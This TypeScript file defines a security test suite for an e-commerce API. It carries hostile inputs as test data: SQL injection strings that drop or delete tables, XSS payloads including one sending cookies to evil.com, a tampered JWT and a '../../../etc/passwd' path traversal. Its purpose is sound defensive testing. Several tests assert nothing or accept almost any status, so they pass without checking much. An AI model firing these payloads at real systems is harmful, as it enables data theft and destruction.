/**
 * Security Testing Agent
 *
 * Tests:
 * - SQL injection testing
 * - XSS and CSRF protection
 * - Authentication bypass attempts
 * - Data encryption validation
 * - Vulnerability scanning
 * - Penetration testing scenarios
 */

import { BaseAgent, HttpHelper, assert, TestResult, AgentOptions } from './base.agent';

export class SecurityAgent extends BaseAgent {
  private http: HttpHelper;
  private authToken?: string;

  constructor(options: AgentOptions = {}) {
    super('Security Testing Agent', 'security', options);
    this.http = new HttpHelper(this.context.apiUrl, this.context.headers, this.context.timeout);
  }

  protected async setup(): Promise<void> {
    try {
      const { data } = await this.http.post('/auth/login', {
        email: 'customer@example.com',
        password: 'Customer123!',
      });
      this.authToken = data.access_token;
    } catch (e) {
      console.warn('Could not authenticate for security tests');
    }
  }

  protected defineTests(): void {
    // ============================================
    // SQL Injection Prevention
    // ============================================
    this.describe('SQL Injection Prevention', (t) => {
      t('should prevent SQL injection in search', async (ctx) => {
        const maliciousQuery = "'; DROP TABLE users; --";
        const { status } = await this.http.get(`/products/search?q=${encodeURIComponent(maliciousQuery)}`);
        assert.ok([200, 400].includes(status), 'Should handle SQL injection attempt');
      });

      t('should prevent SQL injection in login', async (ctx) => {
        const { status } = await this.http.post('/auth/login', {
          email: "admin@test.com' OR '1'='1",
          password: "' OR '1'='1",
        });
        assert.ok([400, 401].includes(status), 'Should reject SQL injection in login');
      });

      t('should prevent SQL injection in ID parameters', async (ctx) => {
        const { status } = await this.http.get("/products/1; DELETE FROM products;--");
        assert.ok([400, 404].includes(status), 'Should reject SQL injection in ID');
      });

      t('should prevent SQL injection in filters', async (ctx) => {
        const { status } = await this.http.get("/products?categoryId=' OR '1'='1");
        assert.ok([200, 400].includes(status), 'Should handle SQL in filters');
      });
    });

    // ============================================
    // XSS Prevention
    // ============================================
    this.describe('XSS Prevention', (t) => {
      t('should sanitize script tags in user input', async (ctx) => {
        if (!this.authToken) return;
        this.http.setAuthToken(this.authToken);

        const { data, status } = await this.http.post('/reviews', {
          productId: 'test-product',
          rating: 5,
          content: '<script>alert("XSS")</script>',
        });

        if (status === 201 || status === 200) {
          if (data.content) {
            assert.notIncludes(data.content, '<script>', 'Should strip script tags');
          }
        }
      });

      t('should escape HTML entities in search results', async (ctx) => {
        const { data, status } = await this.http.get('/products/search?q=<img src=x onerror=alert(1)>');
        assert.ok([200, 400].includes(status), 'Should handle XSS in search');
      });

      t('should prevent stored XSS in user profiles', async (ctx) => {
        if (!this.authToken) return;
        this.http.setAuthToken(this.authToken);

        const { status } = await this.http.patch('/users/profile', {
          name: '<script>document.cookie</script>',
          bio: '<img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)">',
        });

        assert.ok([200, 400].includes(status), 'Should handle XSS in profile');
      });

      t('should sanitize SVG uploads', async (ctx) => {
        if (!this.authToken) return;
        this.http.setAuthToken(this.authToken);

        const { status } = await this.http.post('/upload', {
          type: 'image',
          content: '<svg onload="alert(1)"><script>alert(1)</script></svg>',
        });

        assert.ok([200, 400, 404].includes(status), 'Should handle malicious SVG');
      });
    });

    // ============================================
    // CSRF Protection
    // ============================================
    this.describe('CSRF Protection', (t) => {
      t('should require CSRF token for state-changing operations', async (ctx) => {
        // Test without CSRF token (should fail or succeed based on implementation)
        const { status } = await this.http.post('/cart/items', {
          productId: 'test',
          quantity: 1,
        });

        // API might use JWT instead of CSRF for SPAs
        assert.ok([200, 201, 401, 403].includes(status), 'Should handle CSRF');
      });

      t('should reject requests with invalid Origin header', async (ctx) => {
        const { status } = await this.http.post(
          '/auth/login',
          { email: 'test@test.com', password: 'test' },
          { headers: { 'Origin': 'http://evil-site.com' } }
        );

        // CORS should block or server should validate
        assert.ok([200, 400, 401, 403].includes(status), 'Should validate origin');
      });

      t('should set SameSite cookie attribute', async (ctx) => {
        const { headers, status } = await this.http.post('/auth/login', {
          email: 'customer@example.com',
          password: 'Customer123!',
        });

        // Check Set-Cookie header if present
        const setCookie = headers.get('set-cookie');
        if (setCookie) {
          // Should have SameSite attribute
        }
      });
    });

    // ============================================
    // Authentication Security
    // ============================================
    this.describe('Authentication Security', (t) => {
      t('should hash passwords (not store plaintext)', async (ctx) => {
        // This is implicitly tested - can't verify directly without DB access
        // The fact that we can't login with "password_hash" instead of actual password
        // indicates passwords are hashed
      });

      t('should enforce password complexity', async (ctx) => {
        const weakPasswords = ['123', 'password', 'test', 'abc'];

        for (const password of weakPasswords) {
          const { status } = await this.http.post('/auth/register', {
            email: `weak-test-${Date.now()}@example.com`,
            password,
            name: 'Weak Password Test',
          });

          assert.statusCode(status, 400, `Should reject weak password: ${password}`);
        }
      });

      t('should prevent timing attacks on login', async (ctx) => {
        // Measure response times for valid vs invalid emails
        // They should be similar to prevent email enumeration
        const start1 = Date.now();
        await this.http.post('/auth/login', {
          email: 'nonexistent-user@example.com',
          password: 'TestPassword123!',
        });
        const time1 = Date.now() - start1;

        const start2 = Date.now();
        await this.http.post('/auth/login', {
          email: 'customer@example.com',
          password: 'WrongPassword123!',
        });
        const time2 = Date.now() - start2;

        // Times should be within reasonable range (not exact due to network)
        // This is more of a guideline test
      });

      t('should lock account after failed attempts', async (ctx) => {
        const email = `lockout-test-${Date.now()}@example.com`;

        // Register user first
        await this.http.post('/auth/register', {
          email,
          password: 'TestPassword123!',
          name: 'Lockout Test',
        });

        // Try wrong password multiple times
        for (let i = 0; i < 10; i++) {
          await this.http.post('/auth/login', {
            email,
            password: 'WrongPassword!',
          });
        }

        // Next attempt should be blocked (429 or 403)
        const { status } = await this.http.post('/auth/login', {
          email,
          password: 'WrongPassword!',
        });

        // Might be 401, 429, or 403 depending on implementation
        assert.ok([401, 403, 429].includes(status), 'Should handle lockout');
      });

      t('should not expose password in responses', async (ctx) => {
        const { data } = await this.http.post('/auth/register', {
          email: `no-password-${Date.now()}@example.com`,
          password: 'TestPassword123!',
          name: 'No Password Test',
        });

        if (data.user) {
          assert.notHasProperty(data.user, 'password', 'Should not return password');
          assert.notHasProperty(data.user, 'passwordHash', 'Should not return hash');
        }
      });
    });

    // ============================================
    // Authorization Security
    // ============================================
    this.describe('Authorization Security', (t) => {
      t('should prevent horizontal privilege escalation', async (ctx) => {
        if (!this.authToken) return;
        this.http.setAuthToken(this.authToken);

        // Try to access another user's data
        const { status } = await this.http.get('/users/other-user-id/orders');
        assert.ok([403, 404].includes(status), 'Should prevent access to other users');
      });

      t('should prevent vertical privilege escalation', async (ctx) => {
        if (!this.authToken) return;
        this.http.setAuthToken(this.authToken);

        // Customer trying to access admin endpoint
        const { status } = await this.http.get('/admin/users');
        assert.statusCode(status, 403, 'Should deny admin access to customer');
      });

      t('should validate JWT token properly', async (ctx) => {
        // Tampered token
        const tamperedToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6IkFETUlOIn0.tampered';

        this.http.setAuthToken(tamperedToken);
        const { status } = await this.http.get('/auth/profile');
        assert.statusCode(status, 401, 'Should reject tampered token');
      });

      t('should reject expired tokens', async (ctx) => {
        // This requires a way to generate expired tokens
        // Typically would use a test helper
      }, { skip: true });

      t('should handle token in different cases', async (ctx) => {
        if (!this.authToken) return;

        // Try with "bearer" instead of "Bearer"
        const { status } = await this.http.get('/auth/profile', {
          headers: { 'Authorization': `bearer ${this.authToken}` },
        });

        // Should work (case-insensitive) or reject properly
        assert.ok([200, 401].includes(status), 'Should handle token case');
      });
    });

    // ============================================
    // Data Protection
    // ============================================
    this.describe('Data Protection', (t) => {
      t('should use HTTPS for sensitive endpoints', async (ctx) => {
        // This is typically an infrastructure test
        // Would check that HTTP redirects to HTTPS in production
      }, { skip: true });

      t('should not expose sensitive data in URLs', async (ctx) => {
        // Tokens, passwords, etc. should not be in query strings
        // This is more of a code review check
      });

      t('should mask sensitive data in logs', async (ctx) => {
        // Would require access to logs to verify
      }, { skip: true });

      t('should encrypt sensitive data at rest', async (ctx) => {
        // Would require database access to verify
      }, { skip: true });

      t('should not expose internal errors', async (ctx) => {
        const { data, status } = await this.http.get('/products/!@#$%^&*()');

        if (status >= 400) {
          const errorStr = JSON.stringify(data);
          assert.notIncludes(errorStr.toLowerCase(), 'stack', 'Should not expose stack trace');
          assert.notIncludes(errorStr.toLowerCase(), 'sql', 'Should not expose SQL');
        }
      });
    });

    // ============================================
    // Rate Limiting
    // ============================================
    this.describe('Rate Limiting', (t) => {
      t('should rate limit API requests', async (ctx) => {
        const requests: number[] = [];

        // Make many rapid requests
        for (let i = 0; i < 100; i++) {
          const { status } = await this.http.get('/products');
          requests.push(status);
        }

        // Should have some 429 responses
        const rateLimited = requests.filter(s => s === 429);
        // Rate limiting might or might not trigger based on config
      }, { timeout: 60000 });

      t('should include rate limit headers', async (ctx) => {
        const { headers, status } = await this.http.get('/products');

        // May include X-RateLimit-* headers
        const rateLimit = headers.get('x-ratelimit-limit');
        const remaining = headers.get('x-ratelimit-remaining');

        // Headers might or might not be present
      });

      t('should have stricter limits for auth endpoints', async (ctx) => {
        // Auth endpoints should have lower limits
        // Would require multiple requests to verify
      });
    });

    // ============================================
    // Security Headers
    // ============================================
    this.describe('Security Headers', (t) => {
      t('should set Content-Security-Policy header', async (ctx) => {
        const { headers } = await this.http.get('/');
        const csp = headers.get('content-security-policy');
        // CSP might be set on web server or API
      });

      t('should set X-Content-Type-Options header', async (ctx) => {
        const { headers } = await this.http.get('/');
        const xcto = headers.get('x-content-type-options');
        // Should be "nosniff" in production
      });

      t('should set X-Frame-Options header', async (ctx) => {
        const { headers } = await this.http.get('/');
        const xfo = headers.get('x-frame-options');
        // Should be "DENY" or "SAMEORIGIN"
      });

      t('should set Strict-Transport-Security header', async (ctx) => {
        const { headers } = await this.http.get('/');
        const hsts = headers.get('strict-transport-security');
        // Should be set in production
      });

      t('should not expose server version', async (ctx) => {
        const { headers } = await this.http.get('/');
        const server = headers.get('server');
        const poweredBy = headers.get('x-powered-by');

        // Should be removed or generic
      });
    });

    // ============================================
    // Input Validation
    // ============================================
    this.describe('Input Validation', (t) => {
      t('should validate email format', async (ctx) => {
        const invalidEmails = ['notanemail', 'a@b', '@example.com', 'test@'];

        for (const email of invalidEmails) {
          const { status } = await this.http.post('/auth/register', {
            email,
            password: 'ValidPassword123!',
            name: 'Test',
          });

          assert.statusCode(status, 400, `Should reject invalid email: ${email}`);
        }
      });

      t('should limit input length', async (ctx) => {
        const longString = 'a'.repeat(100000);

        const { status } = await this.http.post('/auth/register', {
          email: 'test@example.com',
          password: 'Test123!',
          name: longString,
        });

        assert.ok([400, 413].includes(status), 'Should reject overly long input');
      });

      t('should reject malformed JSON', async (ctx) => {
        const response = await fetch(`${this.context.apiUrl}/auth/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: '{invalid json',
        });

        assert.statusCode(response.status, 400, 'Should reject malformed JSON');
      });

      t('should handle null bytes in input', async (ctx) => {
        const { status } = await this.http.post('/auth/login', {
          email: 'test\x00@example.com',
          password: 'Test123!',
        });

        assert.ok([400, 401].includes(status), 'Should handle null bytes');
      });

      t('should sanitize file upload names', async (ctx) => {
        if (!this.authToken) return;
        this.http.setAuthToken(this.authToken);

        const { status } = await this.http.post('/upload', {
          filename: '../../../etc/passwd',
          type: 'image',
        });

        assert.ok([200, 400, 404].includes(status), 'Should sanitize filenames');
      });
    });

    // ============================================
    // Session Management
    // ============================================
    this.describe('Session Management', (t) => {
      t('should invalidate session on logout', async (ctx) => {
        // Login
        const { data } = await this.http.post('/auth/login', {
          email: 'customer@example.com',
          password: 'Customer123!',
        });

        const token = data.access_token;
        this.http.setAuthToken(token);

        // Logout
        await this.http.post('/auth/logout', {});

        // Try to use old token
        const { status } = await this.http.get('/auth/profile');

        // Might still work with stateless JWT, or fail with session blacklist
        assert.ok([200, 401].includes(status), 'Should handle logout properly');
      });

      t('should handle concurrent sessions', async (ctx) => {
        // Login twice
        const { data: login1 } = await this.http.post('/auth/login', {
          email: 'customer@example.com',
          password: 'Customer123!',
        });

        const { data: login2 } = await this.http.post('/auth/login', {
          email: 'customer@example.com',
          password: 'Customer123!',
        });

        // Both tokens should work (or only latest, depending on policy)
        this.http.setAuthToken(login1.access_token);
        const { status: status1 } = await this.http.get('/auth/profile');

        this.http.setAuthToken(login2.access_token);
        const { status: status2 } = await this.http.get('/auth/profile');

        // At least the second should work
        assert.statusCode(status2, 200, 'Latest session should work');
      });

      t('should set secure session cookie flags', async (ctx) => {
        const { headers } = await this.http.post('/auth/login', {
          email: 'customer@example.com',
          password: 'Customer123!',
        });

        const setCookie = headers.get('set-cookie');
        // In production, should have Secure and HttpOnly flags
      });
    });
  }
}

/**
 * Export runTests function for orchestrator
 */
export async function runTests(options: AgentOptions = {}): Promise<TestResult[]> {
  const agent = new SecurityAgent(options);
  return agent.runTests(options);
}

// CLI entry point
if (require.main === module) {
  runTests({ verbose: true })
    .then(results => {
      const passed = results.filter(r => r.status === 'passed').length;
      const failed = results.filter(r => r.status === 'failed').length;
      console.log(`\n${passed} passed, ${failed} failed`);
      process.exit(failed > 0 ? 1 : 0);
    })
    .catch(err => {
      console.error('Test run failed:', err);
      process.exit(1);
    });
}
